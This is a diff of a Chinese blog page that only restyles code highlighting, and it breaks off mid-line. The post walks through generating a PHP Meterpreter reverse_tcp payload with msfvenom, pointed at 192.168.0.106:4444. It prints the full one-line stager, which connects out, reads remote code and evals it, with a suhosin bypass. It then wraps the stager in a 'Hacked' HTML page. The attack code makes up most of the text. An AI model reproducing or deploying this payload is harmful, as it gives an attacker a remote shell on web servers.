-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p php/meterpreter/reverse_tcp <span style="color:#bb60d5">LHOST</span><span style="color:#666">=</span>192.168.0.106 <span style="color:#bb60d5">LPORT</span><span style="color:#666">=</span><span style="color:#40a070">4444</span> -o test.php
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ msfvenom -p php/meterpreter/reverse_tcp <span style="color:#8be9fd;font-style:italic">LHOST</span><span style="color:#ff79c6">=</span>192.168.0.106 <span style="color:#8be9fd;font-style:italic">LPORT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">4444</span> -o test.php
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-35-25.png" alt=""></p>
 <p>这样就生成好了。来看看里面有什么？</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#60a0b0;font-style:italic">/*&lt;?php /**/</span> error_reporting(<span style="color:#40a070">0</span>); <span style="color:#bb60d5">$ip</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;192.168.0.106&#39;</span>; <span style="color:#bb60d5">$port</span> <span style="color:#666">=</span> <span style="color:#40a070">4444</span>; <span style="color:#007020;font-weight:bold">if</span> ((<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream_socket_client&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(<span style="color:#4070a0">&#34;tcp://</span><span style="color:#70a0d0;font-style:italic">{</span><span style="color:#bb60d5">$ip</span><span style="color:#70a0d0;font-style:italic">}</span><span style="color:#4070a0">:</span><span style="color:#70a0d0;font-style:italic">{</span><span style="color:#bb60d5">$port</span><span style="color:#70a0d0;font-style:italic">}</span><span style="color:#4070a0">&#34;</span>); <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span> <span style="color:#666">&amp;&amp;</span> (<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;fsockopen&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(<span style="color:#bb60d5">$ip</span>, <span style="color:#bb60d5">$port</span>); <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span> <span style="color:#666">&amp;&amp;</span> (<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;socket_create&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span style="color:#bb60d5">$res</span> <span style="color:#666">=</span> <span style="color:#666">@</span>socket_connect(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$ip</span>, <span style="color:#bb60d5">$port</span>); <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$res</span>) { <span style="color:#007020;font-weight:bold">die</span>(); } <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;socket&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">die</span>(<span style="color:#4070a0">&#39;no socket funcs&#39;</span>); } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span>) { <span style="color:#007020;font-weight:bold">die</span>(<span style="color:#4070a0">&#39;no socket&#39;</span>); } <span style="color:#007020;font-weight:bold">switch</span> (<span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;stream&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> fread(<span style="color:#bb60d5">$s</span>, <span style="color:#40a070">4</span>); <span style="color:#007020;font-weight:bold">break</span>; <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;socket&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> socket_read(<span style="color:#bb60d5">$s</span>, <span style="color:#40a070">4</span>); <span style="color:#007020;font-weight:bold">break</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$len</span>) { <span style="color:#007020;font-weight:bold">die</span>(); } <span style="color:#bb60d5">$a</span> <span style="color:#666">=</span> unpack(<span style="color:#4070a0">&#34;Nlen&#34;</span>, <span style="color:#bb60d5">$len</span>); <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$a</span>[<span style="color:#4070a0">&#39;len&#39;</span>]; <span style="color:#bb60d5">$b</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;&#39;</span>; <span style="color:#007020;font-weight:bold">while</span> (strlen(<span style="color:#bb60d5">$b</span>) <span style="color:#666">&lt;</span> <span style="color:#bb60d5">$len</span>) { <span style="color:#007020;font-weight:bold">switch</span> (<span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;stream&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$b</span> <span style="color:#666">.=</span> fread(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$len</span><span style="color:#666">-</span>strlen(<span style="color:#bb60d5">$b</span>)); <span style="color:#007020;font-weight:bold">break</span>; <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;socket&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$b</span> <span style="color:#666">.=</span> socket_read(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$len</span><span style="color:#666">-</span>strlen(<span style="color:#bb60d5">$b</span>)); <span style="color:#007020;font-weight:bold">break</span>; } } <span style="color:#bb60d5">$GLOBALS</span>[<span style="color:#4070a0">&#39;msgsock&#39;</span>] <span style="color:#666">=</span> <span style="color:#bb60d5">$s</span>; <span style="color:#bb60d5">$GLOBALS</span>[<span style="color:#4070a0">&#39;msgsock_type&#39;</span>] <span style="color:#666">=</span> <span style="color:#bb60d5">$s_type</span>; <span style="color:#007020;font-weight:bold">if</span> (extension_loaded(<span style="color:#4070a0">&#39;suhosin&#39;</span>) <span style="color:#666">&amp;&amp;</span> ini_get(<span style="color:#4070a0">&#39;suhosin.executor.disable_eval&#39;</span>)) { <span style="color:#bb60d5">$suhosin_bypass</span><span style="color:#666">=</span>create_function(<span style="color:#4070a0">&#39;&#39;</span>, <span style="color:#bb60d5">$b</span>); <span style="color:#bb60d5">$suhosin_bypass</span>(); } <span style="color:#007020;font-weight:bold">else</span> { <span style="color:#007020;font-weight:bold">eval</span>(<span style="color:#bb60d5">$b</span>); } <span style="color:#007020;font-weight:bold">die</span>();
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-php" data-lang="php"><span style="color:#6272a4">/*&lt;?php /**/</span> error_reporting(<span style="color:#bd93f9">0</span>); <span style="color:#8be9fd;font-style:italic">$ip</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;192.168.0.106&#39;</span>; <span style="color:#8be9fd;font-style:italic">$port</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4444</span>; <span style="color:#ff79c6">if</span> ((<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream_socket_client&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(<span style="color:#f1fa8c">&#34;tcp://</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$ip</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$port</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>); <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;fsockopen&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(<span style="color:#8be9fd;font-style:italic">$ip</span>, <span style="color:#8be9fd;font-style:italic">$port</span>); <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;socket_create&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span style="color:#8be9fd;font-style:italic">$res</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>socket_connect(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$ip</span>, <span style="color:#8be9fd;font-style:italic">$port</span>); <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$res</span>) { <span style="color:#ff79c6">die</span>(); } <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;socket&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;no socket funcs&#39;</span>); } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span>) { <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;no socket&#39;</span>); } <span style="color:#ff79c6">switch</span> (<span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;stream&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> fread(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#bd93f9">4</span>); <span style="color:#ff79c6">break</span>; <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;socket&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> socket_read(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#bd93f9">4</span>); <span style="color:#ff79c6">break</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$len</span>) { <span style="color:#ff79c6">die</span>(); } <span style="color:#8be9fd;font-style:italic">$a</span> <span style="color:#ff79c6">=</span> unpack(<span style="color:#f1fa8c">&#34;Nlen&#34;</span>, <span style="color:#8be9fd;font-style:italic">$len</span>); <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$a</span>[<span style="color:#f1fa8c">&#39;len&#39;</span>]; <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>; <span style="color:#ff79c6">while</span> (strlen(<span style="color:#8be9fd;font-style:italic">$b</span>) <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">$len</span>) { <span style="color:#ff79c6">switch</span> (<span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;stream&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">.=</span> fread(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$len</span><span style="color:#ff79c6">-</span>strlen(<span style="color:#8be9fd;font-style:italic">$b</span>)); <span style="color:#ff79c6">break</span>; <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;socket&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">.=</span> socket_read(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$len</span><span style="color:#ff79c6">-</span>strlen(<span style="color:#8be9fd;font-style:italic">$b</span>)); <span style="color:#ff79c6">break</span>; } } <span style="color:#8be9fd;font-style:italic">$GLOBALS</span>[<span style="color:#f1fa8c">&#39;msgsock&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$s</span>; <span style="color:#8be9fd;font-style:italic">$GLOBALS</span>[<span style="color:#f1fa8c">&#39;msgsock_type&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$s_type</span>; <span style="color:#ff79c6">if</span> (extension_loaded(<span style="color:#f1fa8c">&#39;suhosin&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> ini_get(<span style="color:#f1fa8c">&#39;suhosin.executor.disable_eval&#39;</span>)) { <span style="color:#8be9fd;font-style:italic">$suhosin_bypass</span><span style="color:#ff79c6">=</span>create_function(<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#8be9fd;font-style:italic">$b</span>); <span style="color:#8be9fd;font-style:italic">$suhosin_bypass</span>(); } <span style="color:#ff79c6">else</span> { <span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$b</span>); } <span style="color:#ff79c6">die</span>();
 </code></pre></td></tr></table>
 </div>
 </div><p>只有一行～！这一行就是嘿嘿。。。自己看啦</p>
 <p>我们加一些html上去吧:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -2458,17 +2450,17 @@ Table: users
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#60a0b0;font-style:italic">/*&lt;?php /**/</span> error_reporting(<span style="color:#40a070">0</span>); <span style="color:#bb60d5">$ip</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;192.168.0.106&#39;</span>; <span style="color:#bb60d5">$port</span> <span style="color:#666">=</span> <span style="color:#40a070">4444</span>; <span style="color:#007020;font-weight:bold">if</span> ((<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream_socket_client&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(<span style="color:#4070a0">&#34;tcp://</span><span style="color:#70a0d0;font-style:italic">{</span><span style="color:#bb60d5">$ip</span><span style="color:#70a0d0;font-style:italic">}</span><span style="color:#4070a0">:</span><span style="color:#70a0d0;font-style:italic">{</span><span style="color:#bb60d5">$port</span><span style="color:#70a0d0;font-style:italic">}</span><span style="color:#4070a0">&#34;</span>); <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span> <span style="color:#666">&amp;&amp;</span> (<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;fsockopen&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(<span style="color:#bb60d5">$ip</span>, <span style="color:#bb60d5">$port</span>); <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;stream&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span> <span style="color:#666">&amp;&amp;</span> (<span style="color:#bb60d5">$f</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;socket_create&#39;</span>) <span style="color:#666">&amp;&amp;</span> is_callable(<span style="color:#bb60d5">$f</span>)) { <span style="color:#bb60d5">$s</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span style="color:#bb60d5">$res</span> <span style="color:#666">=</span> <span style="color:#666">@</span>socket_connect(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$ip</span>, <span style="color:#bb60d5">$port</span>); <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$res</span>) { <span style="color:#007020;font-weight:bold">die</span>(); } <span style="color:#bb60d5">$s_type</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;socket&#39;</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">die</span>(<span style="color:#4070a0">&#39;no socket funcs&#39;</span>); } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$s</span>) { <span style="color:#007020;font-weight:bold">die</span>(<span style="color:#4070a0">&#39;no socket&#39;</span>); } <span style="color:#007020;font-weight:bold">switch</span> (<span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;stream&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> fread(<span style="color:#bb60d5">$s</span>, <span style="color:#40a070">4</span>); <span style="color:#007020;font-weight:bold">break</span>; <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;socket&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> socket_read(<span style="color:#bb60d5">$s</span>, <span style="color:#40a070">4</span>); <span style="color:#007020;font-weight:bold">break</span>; } <span style="color:#007020;font-weight:bold">if</span> (<span style="color:#666">!</span><span style="color:#bb60d5">$len</span>) { <span style="color:#007020;font-weight:bold">die</span>(); } <span style="color:#bb60d5">$a</span> <span style="color:#666">=</span> unpack(<span style="color:#4070a0">&#34;Nlen&#34;</span>, <span style="color:#bb60d5">$len</span>); <span style="color:#bb60d5">$len</span> <span style="color:#666">=</span> <span style="color:#bb60d5">$a</span>[<span style="color:#4070a0">&#39;len&#39;</span>]; <span style="color:#bb60d5">$b</span> <span style="color:#666">=</span> <span style="color:#4070a0">&#39;&#39;</span>; <span style="color:#007020;font-weight:bold">while</span> (strlen(<span style="color:#bb60d5">$b</span>) <span style="color:#666">&lt;</span> <span style="color:#bb60d5">$len</span>) { <span style="color:#007020;font-weight:bold">switch</span> (<span style="color:#bb60d5">$s_type</span>) { <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;stream&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$b</span> <span style="color:#666">.=</span> fread(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$len</span><span style="color:#666">-</span>strlen(<span style="color:#bb60d5">$b</span>)); <span style="color:#007020;font-weight:bold">break</span>; <span style="color:#007020;font-weight:bold">case</span> <span style="color:#4070a0">&#39;socket&#39;</span><span style="color:#666">:</span> <span style="color:#bb60d5">$b</span> <span style="color:#666">.=</span> socket_read(<span style="color:#bb60d5">$s</span>, <span style="color:#bb60d5">$len</span><span style="color:#666">-</span>strlen(<span style="color:#bb60d5">$b</span>)); <span style="color:#007020;font-weight:bold">break</span>; } } <span style="color:#bb60d5">$GLOBALS</span>[<span style="color:#4070a0">&#39;msgsock&#39;</span>] <span style="color:#666">=</span> <span style="color:#bb60d5">$s</span>; <span style="color:#bb60d5">$GLOBALS</span>[<span style="color:#4070a0">&#39;msgsock_type&#39;</span>] <span style="color:#666">=</span> <span style="color:#bb60d5">$s_type</span>; <span style="color:#007020;font-weight:bold">if</span> (extension_loaded(<span style="color:#4070a0">&#39;suhosin&#39;</span>) <span style="color:#666">&amp;&amp;</span> ini_get(<span style="color:#4070a0">&#39;suhosin.executor.disable_eval&#39;</span>)) { <span style="color:#bb60d5">$suhosin_bypass</span><span style="color:#666">=</span>create_function(<span style="color:#4070a0">&#39;&#39;</span>, <span style="color:#bb60d5">$b</span>); <span style="color:#bb60d5">$suhosin_bypass</span>(); } <span style="color:#007020;font-weight:bold">else</span> { <span style="color:#007020;font-weight:bold">eval</span>(<span style="color:#bb60d5">$b</span>); } <span style="color:#007020;font-weight:bold">die</span>();<span style="color:#007020">?&gt;</span><span style="">
-</span><span style="">&lt;html&gt;
-</span><span style="">&lt;head&gt;
-</span><span style="">&lt;meta charset=&#34;utf-8&#34; /&gt;
-</span><span style="">&lt;/head&gt;
-</span><span style="">&lt;body&gt;
-</span><span style="">&lt;h1&gt;Hacked&lt;/h1&gt;
-</span><span style="">&lt;/body&gt;
-</span><span style="">&lt;/html&gt;
-</span><span style="">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-php" data-lang="php"><span style="color:#6272a4">/*&lt;?php /**/</span> error_reporting(<span style="color:#bd93f9">0</span>); <span style="color:#8be9fd;font-style:italic">$ip</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;192.168.0.106&#39;</span>; <span style="color:#8be9fd;font-style:italic">$port</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4444</span>; <span style="color:#ff79c6">if</span> ((<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream_socket_client&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(<span style="color:#f1fa8c">&#34;tcp://</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$ip</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$port</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>); <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;fsockopen&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(<span style="color:#8be9fd;font-style:italic">$ip</span>, <span style="color:#8be9fd;font-style:italic">$port</span>); <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;stream&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd;font-style:italic">$f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;socket_create&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> is_callable(<span style="color:#8be9fd;font-style:italic">$f</span>)) { <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span style="color:#8be9fd;font-style:italic">$res</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>socket_connect(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$ip</span>, <span style="color:#8be9fd;font-style:italic">$port</span>); <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$res</span>) { <span style="color:#ff79c6">die</span>(); } <span style="color:#8be9fd;font-style:italic">$s_type</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;socket&#39;</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;no socket funcs&#39;</span>); } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$s</span>) { <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;no socket&#39;</span>); } <span style="color:#ff79c6">switch</span> (<span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;stream&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> fread(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#bd93f9">4</span>); <span style="color:#ff79c6">break</span>; <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;socket&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> socket_read(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#bd93f9">4</span>); <span style="color:#ff79c6">break</span>; } <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$len</span>) { <span style="color:#ff79c6">die</span>(); } <span style="color:#8be9fd;font-style:italic">$a</span> <span style="color:#ff79c6">=</span> unpack(<span style="color:#f1fa8c">&#34;Nlen&#34;</span>, <span 